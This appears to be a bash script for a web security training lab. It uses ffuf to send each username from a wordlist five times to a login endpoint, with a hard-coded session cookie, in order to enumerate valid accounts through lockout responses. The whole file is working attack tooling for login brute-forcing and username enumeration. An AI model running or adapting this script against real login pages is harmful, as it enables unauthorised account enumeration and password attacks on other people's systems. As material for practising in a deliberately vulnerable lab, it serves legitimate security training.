#!/bin/bash

# Define the target URL and cookie
TARGET_URL='https://0a8d0037043d30a78283ab1600ee00f7.web-security-academy.net/login'
COOKIE='Cookie: session=RZgswyaL0GUJBT6vOucb0aJDdIb5TG5J'

# Check if username.txt exists
if [[ ! -f username.txt ]]; then
    echo "Error: username.txt file not found!"
    exit 1
fi

# Create a temporary file for the usernames
tempfile=$(mktemp)

# Loop through each username in the username.txt file and write to tempfile
while IFS= read -r username; do
    for i in {1..5}; do
        echo "$username" >> "$tempfile"
    done
done < username.txt

# Use ffuf with the temporary file
ffuf -u "$TARGET_URL" -X POST -H "$COOKIE" -d "username=FUZZ&password=test" -w "$tempfile:FUZZ" -c -t 75 -o result.html -of html -v

# Clean up the temporary file
rm "$tempfile"
